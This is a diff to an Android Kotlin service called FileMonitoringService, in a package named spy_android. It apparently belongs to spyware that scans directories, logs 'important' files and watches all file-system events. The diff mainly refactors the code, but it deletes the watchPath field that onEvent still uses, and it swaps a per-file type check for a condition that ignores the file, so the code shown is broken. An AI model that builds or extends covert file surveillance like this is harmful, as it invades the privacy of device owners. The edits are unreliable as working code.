@@ -1,5 +1,6 @@
 package com.example.spy_android.services
 
+import android.os.FileObserver
 import android.app.*
 import android.content.Context
 import android.content.Intent
@@ -287,7 +288,7 @@ class FileMonitoringService : Service() {
         }
     }
 
-    private fun scanDirectory(
+    private suspend fun scanDirectory(
         directory: File,
         results: MutableList<Map<String, Any>>,
         depth: Int,
@@ -314,8 +315,7 @@ class FileMonitoringService : Service() {
 
                         results.add(fileInfo)
 
-                        // 중요한 파일 확장자 감지
-                        if (isImportantFileType(file.name)) {
+                        if (importantFiles.isNotEmpty()) {
                             logImportantFileFound(fileInfo)
                         }
 
@@ -429,8 +429,6 @@ class FileMonitoringService : Service() {
 
     // 커스텀 파일 관찰자
     private inner class CustomFileObserver(path: String) : FileObserver(path, ALL_EVENTS) {
-        private val watchPath = path
-
         override fun onEvent(event: Int, path: String?) {
             serviceScope.launch {
                 handleFileSystemEvent(event, path, watchPath)
@@ -468,16 +466,16 @@ class FileMonitoringService : Service() {
     }
 
     private fun getFileEventType(event: Int): String {
-        return when (event and ALL_EVENTS) {
-            CREATE -> "FILE_CREATED"
-            DELETE -> "FILE_DELETED"
-            MODIFY -> "FILE_MODIFIED"
-            MOVED_FROM -> "FILE_MOVED_FROM"
-            MOVED_TO -> "FILE_MOVED_TO"
-            OPEN -> "FILE_OPENED"
-            CLOSE_WRITE -> "FILE_CLOSED_WRITE"
-            CLOSE_NOWRITE -> "FILE_CLOSED_NOWRITE"
-            else -> "FILE_EVENT_${event}"
+        return when (event and FileObserver.ALL_EVENTS) {
+            FileObserver.CREATE -> "FILE_CREATED"
+            FileObserver.DELETE -> "FILE_DELETED"
+            FileObserver.MODIFY -> "FILE_MODIFIED"
+            FileObserver.MOVED_FROM -> "FILE_MOVED_FROM"
+            FileObserver.MOVED_TO -> "FILE_MOVED_TO"
+            FileObserver.OPEN -> "FILE_OPENED"
+            FileObserver.CLOSE_WRITE -> "FILE_CLOSED_WRITE"
+            FileObserver.CLOSE_NOWRITE -> "FILE_CLOSED_NOWRITE"
+            else -> "FILE_EVENT_$event"
         }
     }
 
